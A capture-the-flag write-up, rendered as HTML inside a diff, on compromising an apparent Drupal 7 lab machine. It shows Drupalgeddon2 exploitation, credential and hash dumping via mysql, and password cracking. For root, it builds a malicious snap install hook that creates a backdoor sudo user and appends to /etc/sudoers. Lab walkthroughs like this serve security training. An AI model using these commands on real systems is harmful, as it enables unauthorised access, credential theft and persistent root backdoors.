@@ -1,0 +1,128 @@
+I"<h1 id="main-points">Main points</h1>
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>[#^6b0a8d</td>
+          <td>dirty_sock vulnerability (snap)](#5E6b0a8d%7Cdirty_sock%20vulnerability%20%28snap%29)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>[#^dd1865</td>
+          <td>drupalgeddon2](#%5Edd1865%7Cdrupalgeddon2)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>As always we start with nmap and find these open ports</p>
+
+<ul>
+  <li>22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</li>
+  <li>80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</li>
+</ul>
+
+<p>We see that the webserver is running Drupal 7, let’s look on google if there are known vulnerabilities for this version of Drupal.</p>
+
+<p>We find this github repo named <a href="https://github.com/dreadlocked/Drupalgeddon2">Drupalgeddon2</a>
+and these exploits : ^dd1865</p>
+
+<ul>
+  <li>
+    <p>https://www.exploit-db.com/exploits/44448</p>
+  </li>
+  <li>
+    <p>https://www.exploit-db.com/exploits/44449</p>
+  </li>
+  <li>
+    <p>https://www.exploit-db.com/exploits/44482
+We try the metasploit module drupalgeddon
+and we go to <code class="language-plaintext highlighter-rouge">sites/default/</code> we see settings.php and grab database creds</p>
+  </li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Service</th>
+      <th>username</th>
+      <th>password</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>mysql</td>
+      <td>drupaluser</td>
+      <td>CQHEy@9M*m23gBVj</td>
+    </tr>
+    <tr>
+      <td>drupal hash</td>
+      <td>hash salt</td>
+      <td>4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We connect to mysql database with our creds</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span> CQHEy@9M<span class="k">*</span>m23gBVj <span class="nt">-e</span> <span class="s2">"show databases;"</span>
+</code></pre></div></div>
+
+<p><img src="../Pasted%20image%2020210709023623.png" alt="Pasted image 20210709023623.png" /> We see that we have a <code class="language-plaintext highlighter-rouge">drupal</code> database, we see that it has a <code class="language-plaintext highlighter-rouge">user</code> table, let’s dump it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span> CQHEy@9M<span class="k">*</span>m23gBVj <span class="nt">-D</span> drupal <span class="nt">-e</span> <span class="s1">'select name,pass from users;'</span>
+</code></pre></div></div>
+
+<p>We get the hash of <code class="language-plaintext highlighter-rouge">Brucetherealadmin</code></p>
+
+<p>|user|hash|
+|—-|—-|
+|brucetherealadmin|$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt|
+let’s crack the hash with John.</p>
+
+<p>we get the password <code class="language-plaintext highlighter-rouge">booboo</code>, let’s connect with ssh. We get the user flag.</p>
+
+<h1 id="priv-esc">Priv Esc</h1>
+<h3 id="dirty_sock-vulnerability"><a href="https://initblog.com/2019/dirty-sock/">dirty_sock vulnerability</a></h3>
+
+<p>^6b0a8d</p>
+
+<p>Let’s see if our user can run something as root with <code class="language-plaintext highlighter-rouge">sudo -l</code>
+we can run <code class="language-plaintext highlighter-rouge">snap</code>
+<img src="../Pasted%20image%2020210709024313.png" alt="Pasted image 20210709024313.png" /></p>
+
+<p>So to get root we have to install a malicious snap package and install it as root. Let’s check <a href="https://gtfobins.github.io/gtfobins/snap/">GTFOBins</a>
+We need to install <a href="https://github.com/jordansissel/fpm">fpm</a> to create our malicious snap package</p>
+
+<p>We make our malicious script that will create a suer with sudo permissions</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> - <span class="o">&gt;</span> script
+useradd hackerman <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$oMAzzKTUH62kHvSC$rYnR4DAyvuLxTdH5QPSXXrNVqZlug.ZY2a.Q2hbBus4R6q57MAfQhrcPy/d/FRFRhUSdh1wO.3yn1nG/WVejq1'</span> <span class="nt">-s</span> /bin/bash
+usermod <span class="nt">-aG</span> <span class="nb">sudo </span>hackerman
+<span class="nb">echo</span> <span class="s2">"hackerman    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
+</code></pre></div></div>
+<p>Note: The encrypted password is generated with python <code class="language-plaintext highlighter-rouge">crypt.crypt("password")</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">COMMAND</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>script<span class="si">)</span>
+<span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> meta/hooks
+<span class="nb">printf</span> <span class="s1">'#!/bin/sh\n%s; false'</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> <span class="o">&gt;</span>meta/hooks/install
+<span class="nb">chmod</span> +x meta/hooks/install
+fpm <span class="nt">-n</span> pwn <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> snap <span class="nt">-a</span> all meta
+</code></pre></div></div>
+<p>And then download it to the target with <code class="language-plaintext highlighter-rouge">curl</code> from python HTTP server.
+<img src="../Pasted%20image%2020210709025549.png" alt="Pasted image 20210709025549.png" /></p>
+
+<p>On the victim machine we run</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>snap <span class="nb">install </span>pwn_1.0_all.snap <span class="nt">--devmode</span>
+</code></pre></div></div>
+<p>We wait for the installation, and we change the user
+<code class="language-plaintext highlighter-rouge">su hackerman</code> we can sudo to <code class="language-plaintext highlighter-rouge">root</code>
+We have root, and we get the flag.</p>
+:ET
